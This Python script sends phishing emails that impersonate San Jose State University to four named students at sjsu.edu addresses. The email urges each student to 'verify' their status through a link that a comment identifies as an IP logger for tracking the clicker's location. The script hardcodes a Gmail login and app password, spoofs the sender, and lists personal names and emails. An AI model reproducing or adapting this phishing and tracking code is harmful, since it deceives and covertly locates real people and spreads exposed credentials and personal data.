import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_verification_email(recipient_email, student_name, verification_link, student_services_email, university_name):
    # html email content
    email_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Verify Your Student Status</title>
    </head>
    <body>
        <p>Dear {student_name},</p>
        
        <p>We hope this email finds you well.</p>
        
        <p>It has come to our attention that there may be an issue with your student status in our records. To ensure that your student privileges are not affected, we kindly request you to verify your current status by clicking on the following link:</p>
        
        <p><a href="{verification_link}">Verify Student Status</a></p>
        
        <p>If you have any questions or concerns regarding your student status, please don't hesitate to contact our Student Services department at {student_services_email}.</p>
        
        <p>Thank you for your prompt attention to this matter.</p>
        
        <p>Best regards,</p>
        <p>{university_name}</p>
        
    </body>
    </html>
    """

    # email message
    message = MIMEMultipart("alternative")
    message["Subject"] = "Verify Your Student Status"
    message["From"] = "sanjose@gmail.com"
    message["To"] = recipient_email


    html_content = MIMEText(email_content, "html")
    message.attach(html_content)

    #sending the email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login("patelvuh@gmail.com", "hnjqrevnqlkwumrs")
            server.sendmail("sanjosestateuniversity414@gmail.com", recipient_email, message.as_string())
        print(f"Email sent successfully to {recipient_email}!")
    except Exception as e:
        print(f"Failed to send email to {recipient_email}: {e}")

#developing array of recipients
recipients = [
    ("Virali Patel", "virali.patel@sjsu.edu"),
    ("Aditi Jorapur", "aditi.jorapur@sjsu.edu"),
    ("Anushka Chokshi", "anushka.chokshi@sjsu.edu"),
    ("Neha Washikar", "neha.washikar@sjsu.edu"),
 ]

#the link passed as parameter here is an ip logger that will track the location of the user at the time of clicking
for name, email in recipients:
    send_verification_email(email, name, "https://iplogger.com/2ZhJe5", "sjsuhelpe@gmail.com", "San Jose State Univeristy")
